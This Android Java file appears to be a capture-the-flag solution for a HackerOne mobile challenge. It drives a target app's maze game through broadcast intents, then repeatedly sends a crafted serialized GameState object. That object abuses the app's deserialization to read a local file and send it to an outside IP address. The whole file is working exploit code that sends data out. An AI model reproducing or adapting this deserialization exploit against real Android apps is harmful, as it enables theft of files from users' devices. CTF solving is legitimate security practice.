package com.hackerone.mobile.chall4hack;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Bundle;
import com.hackerone.mobile.challenge4.*;
import android.os.PersistableBundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {


    public int curLevel = -1;
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        startGame();

        sleep(1000);

        registerReceiver(new BroadcastReceiver() {
            public void onReceive(Context context, Intent intent) {
                parseIntent(context, intent);
            }
        }, new IntentFilter("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER"));

        getMazeIntent();

    }

    public void sleep(int milis){
        try {
            Thread.sleep(milis);
        } catch (Exception e) {

        }

    }

    public void getMazeIntent(){
        Intent getMaze = new Intent();
        getMaze.putExtra("get_maze", "");
        getMaze.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
        sendBroadcast(getMaze);
    }

    public void parseIntent(Context context, Intent intent){
        if(intent.hasExtra("walls")){
            ArrayList position = (ArrayList) intent.getSerializableExtra("positions");
            if(MazeSolver.isNewMaze((boolean[][]) intent.getSerializableExtra("walls"))){
                MazeSolver.setMaze((boolean[][]) intent.getSerializableExtra("walls"));
                ++curLevel;
                Point curPos = new Point((int)position.get(0), (int)position.get(1));
                Point endPos = new Point((int)position.get(2), (int)position.get(3));
                MazeSolver.solveMaze(curPos, endPos);
                Log.d("AAAAAAAAAAAA", "New Maze bois");
            }

            Point curPos = new Point((int)position.get(0), (int)position.get(1));

            sendMove(MazeSolver.solvedMaze[curPos.y][curPos.x]);

            Log.d("AAAAAAAA CUR-LVL", ""+curLevel);
            if(curLevel <= 2)
            getMazeIntent();
            else sendCerealIntent();

        }

    }

    public void sendMove(char move){
        Intent moveIntent = new Intent();
        moveIntent.putExtra("move", move);
        moveIntent.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
        sendBroadcast(moveIntent);
    }

    public void startGame(){
        Intent startIntent = new Intent();

        startIntent.putExtra("start_game", "");

        startIntent.setAction("com.hackerone.mobile.challenge4.menu");

        sendBroadcast(startIntent);

    }

    public void sendCerealIntent(){
        BroadcastAnnouncer brA = new BroadcastAnnouncer("/data/local/tmp/challenge4", "/data/local/tmp/challenge4", "http://45.32.190.70/");

        GameState myState = new GameState("hacked.state", brA);
        myState.levelsCompleted = 3;

        Intent myIntent = new Intent();

        myIntent.putExtra("cereal", myState);
        myIntent.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
        sendBroadcast(myIntent);

        sleep(100);

        sendCerealIntent();
    }
}
